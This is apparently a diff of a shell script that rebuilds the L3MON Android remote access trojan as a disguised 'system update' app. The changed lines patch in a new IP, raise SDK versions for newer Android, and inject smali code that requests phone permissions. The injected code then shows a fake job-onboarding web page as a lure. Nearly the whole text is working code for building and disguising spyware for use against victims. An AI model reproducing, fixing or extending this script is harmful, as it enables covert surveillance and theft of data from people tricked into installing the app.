@@ -17,16 +17,19 @@ if [ -d "payload_source/smali/$OLD_PATH" ]; then
     rm -rf "payload_source/smali/com/etechd"
 fi
 
-# 2. Update SDK
-sed -i 's/targetSdkVersion: .*/targetSdkVersion: 30/g' payload_source/apktool.yml
-sed -i 's/targetSdkVersion="[0-9]*"/targetSdkVersion="30"/g' payload_source/AndroidManifest.xml
+# 2. Update SDK (Android 14 Compatibility)
+# Setting minSdkVersion to 26 (Oreo) and targetSdkVersion to 31
+sed -i 's/minSdkVersion: .*/minSdkVersion: 26/g' payload_source/apktool.yml
+sed -i 's/targetSdkVersion: .*/targetSdkVersion: 31/g' payload_source/apktool.yml
+sed -i 's/minSdkVersion="[0-9]*"/minSdkVersion="26"/g' payload_source/AndroidManifest.xml
+sed -i 's/targetSdkVersion="[0-9]*"/targetSdkVersion="31"/g' payload_source/AndroidManifest.xml
 
 # 3. Patch IP
 chmod +x patch_payload.sh
 sed -i "s|$OLD_PATH/|$NEW_PATH/|g" patch_payload.sh
 ./patch_payload.sh
 
-# 4. Create Lure (Fixed Smali Semicolons)
+# 4. Create Lure (Fully Qualified Smali)
 cat > lure.smali <<LURE
     const/4 v0, 0x7
     new-array v0, v0, [Ljava/lang/String;
@@ -52,7 +55,7 @@ cat > lure.smali <<LURE
     const-string v2, "android.permission.READ_PHONE_STATE"
     aput-object v2, v0, v1
     const/4 v1, 0x1
-    invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions([Ljava/lang/String;I)V
+    invoke-virtual {p0, v0, v1}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V
 
     new-instance v0, Landroid/webkit/WebView;
     invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
@@ -63,16 +66,22 @@ cat > lure.smali <<LURE
     const-string v1, "https://global-talent-onboarding-portal.vercel.app/"
     invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
     invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V
+    return-void
 LURE
 
-# 5. Inject (Fixed address match with semicolon)
-sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|r lure.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
-sed -i "s|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|# Original UI disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+# 5. Inject at the end of onCreate (Replacing finish and return-void)
+# We search for the 'invoke-virtual {p0}, L.../MainActivity;->finish()V' line and replace it + the return
+# This is line 180 in the current Smali
+sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V||g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+sed -i "s|return-void|# injected|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+# Append the lure before the .end method
+sed -i "s|.end method|$(cat lure.smali)\n.end method|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+# Clean up the double return (if any)
+sed -i 's/# injected/return-void/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
-# 6. Disable Loop
-sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"/const-string v7, "unused"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
-sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "unused"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
-sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+# 6. Disable Loop (Clean Strings)
+sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"/const-string v7, "none"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
+sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "none"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
-# 7. Manifest Update (Simplified)
-sed -i "s|$NEW_PKG.MainActivity|$NEW_PKG.MainActivity\" android:excludeFromRecents=\"true\"|g" payload_source/AndroidManifest.xml
+# 7. Manifest (Stable Patch)
+sed -i "s|com.etechd.l3mon.MainActivity|com.sys.update.svc.MainActivity|g" payload_source/AndroidManifest.xml
